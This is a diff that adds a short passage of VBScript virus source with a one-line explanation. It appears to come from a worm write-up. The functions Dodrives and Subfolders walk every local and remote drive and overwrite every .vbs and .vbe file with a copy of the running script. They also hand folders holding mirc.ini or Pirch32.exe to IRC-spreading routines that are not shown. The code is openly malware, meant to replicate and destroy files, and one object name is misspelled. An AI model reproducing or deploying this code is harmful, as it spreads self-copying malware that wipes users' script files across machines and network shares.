@@ -1,0 +1,43 @@
+These two funtions will search in all the HD for mirc.ini, Pirch32.exe,
+vbs and vbe files. When its found any of them it calls the infection function.
+_______________________________________________________________________
+¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
+Function Dodrives()
+On Error Resume Next
+Set fso = CreateObject("scipting.filesystemobject")
+Set Drives = fso.Drives
+For Each Drive In Drives
+If Drive.Drivetype = Remote Then
+Drivefull = Drive & "\"
+Call Subfolders(Drivefull)
+ElseIf Drive.IsReady Then
+Drivefull = Drive & "\"
+Call Subfolders(Drivefull)
+End If
+Next
+End Function
+Function Subfolders(path)
+newpath=path
+Set Fold = fso.GetFolder(newpath)
+Set Files = Fold.Files
+For Each file In Files
+If fso.GetExtensionName(file.path) = "vbs" Then
+fso.copyfile wscript.scriptfullname, file.path, True
+End If
+If fso.GetExtensionName(file.path) = "vbe" Then
+fso.copyfile wscript.scriptfullname, file.path, True
+End If
+If file.Name = "mirc.ini" Then
+Mirc (file.ParentFolder)
+End If
+If file.Name = "Pirch32.exe" Then
+Pirch (file.ParentFolder)
+End If
+Next
+Set file = Fold.Subfolders
+For Each Subfol In file
+Call Subfolders(Subfol.path)
+Next
+End Function
+_______________________________________________________________________
+¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
